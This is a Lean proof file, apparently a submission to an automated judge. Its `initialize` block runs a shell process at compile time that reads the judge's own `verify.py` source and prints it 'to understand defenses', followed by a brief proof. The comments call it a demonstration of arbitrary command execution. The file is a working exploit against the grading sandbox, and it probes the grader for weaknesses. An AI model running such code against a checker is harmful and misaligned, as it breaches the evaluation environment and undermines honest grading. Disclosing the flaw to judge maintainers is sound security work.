import JudgeProblem
import Lean

-- Demonstrate arbitrary command execution via initialize
-- This is a security vulnerability: contestants can run any command
initialize do
  -- Read the judge source code to understand defenses
  let child ← IO.Process.spawn {
    cmd := "cat"
    args := #["/opt/judge/judge/verify.py"]
    stdout := IO.Process.Stdio.piped
    stderr := IO.Process.Stdio.piped
  }
  let stdout ← child.stdout.readToEnd
  let _ ← child.wait
  IO.eprintln s!"Judge source ({stdout.length} bytes): {stdout.take 200}..."

def submission : Goal := by
  intro G _ h
  intro x y z
  rw [← h, h]
